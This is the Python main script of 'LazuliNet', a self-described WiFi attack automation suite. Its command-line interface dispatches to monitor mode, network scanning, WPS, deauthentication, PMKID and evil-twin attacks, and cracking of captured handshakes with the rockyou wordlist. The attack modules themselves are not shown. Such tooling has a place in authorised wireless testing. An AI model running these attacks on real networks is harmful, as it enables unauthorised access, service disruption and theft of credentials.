#!/usr/bin/env python3
"""
╔══════════════════════════════════════════╗
║           LAZULINET v1.0                 ║
║  WiFi Attack Automation Suite            ║
║  Debian Edition                          ║
║  "No void unfilled, no target unbroken"  ║
╚══════════════════════════════════════════╝
"""
import os
import sys
import time
import signal
import subprocess
import argparse
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from modules.scanner import Scanner
from modules.attacker import Attacker
from modules.cracker import Cracker
from modules.reporter import Reporter
from modules.evil_twin import EvilTwin
from modules.utils import banner, ensure_monitor_mode, restore_managed_mode, check_root, detect_interface

INTERFACE = "wlx3408049d80e8"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "output")

def scan(args):
    scanner = Scanner(args.interface or INTERFACE, OUTPUT_DIR)
    scanner.run(timeout=args.timeout, target_bssid=args.bssid, channel=args.channel)

def attack(args):
    attacker = Attacker(args.interface or INTERFACE, OUTPUT_DIR)
    if args.wps:
        attacker.wps_attack(args.bssid, args.channel)
    elif args.deauth:
        attacker.deauth_attack(args.bssid, args.channel, args.client)
    elif args.pmkid:
        attacker.pmkid_attack(args.bssid, args.channel)
    elif args.evil_twin:
        et = EvilTwin(args.interface or INTERFACE, OUTPUT_DIR)
        et.launch(args.essid, args.channel)
    else:
        print("[!] Specify attack type: --wps, --deauth, --pmkid, --evil-twin")

def crack(args):
    cracker = Cracker(WORDLIST, OUTPUT_DIR)
    cracker.crack(args.capture, args.mode)

def report(args):
    reporter = Reporter(OUTPUT_DIR)
    reporter.generate()

def monitor_cmd(args):
    if args.stop:
        restore_managed_mode(args.interface or INTERFACE)
    else:
        ensure_monitor_mode(args.interface or INTERFACE)

def main():
    parser = argparse.ArgumentParser(description="LazuliNet - WiFi Attack Automation Suite")
    subparsers = parser.add_subparsers(dest="command", help="Commands")

    # Monitor
    mon = subparsers.add_parser("monitor", help="Enable/disable monitor mode")
    mon.add_argument("--interface", help="Wireless interface")
    mon.add_argument("--stop", action="store_true", help="Restore managed mode")
    mon.set_defaults(func=monitor_cmd)

    # Scan
    s = subparsers.add_parser("scan", help="Scan for networks")
    s.add_argument("--interface", help="Wireless interface")
    s.add_argument("--timeout", type=int, default=60)
    s.add_argument("--bssid")
    s.add_argument("--channel")
    s.set_defaults(func=scan)

    # Attack
    a = subparsers.add_parser("attack", help="Attack a target")
    a.add_argument("--interface", help="Wireless interface")
    a.add_argument("--bssid", required=True)
    a.add_argument("--channel", required=True, type=int)
    a.add_argument("--wps", action="store_true")
    a.add_argument("--deauth", action="store_true")
    a.add_argument("--pmkid", action="store_true")
    a.add_argument("--evil-twin", action="store_true")
    a.add_argument("--essid", help="SSID for Evil Twin")
    a.add_argument("--client")
    a.set_defaults(func=attack)

    # Crack
    c = subparsers.add_parser("crack", help="Crack handshake/PMKID")
    c.add_argument("--capture", required=True)
    c.add_argument("--mode", type=int, default=22000)
    c.set_defaults(func=crack)

    # Report
    r = subparsers.add_parser("report", help="Generate findings report")
    r.set_defaults(func=report)

    args = parser.parse_args()
    banner()

    if args.command is None:
        parser.print_help()
        return

    args.func(args)

if __name__ == "__main__":
    main()
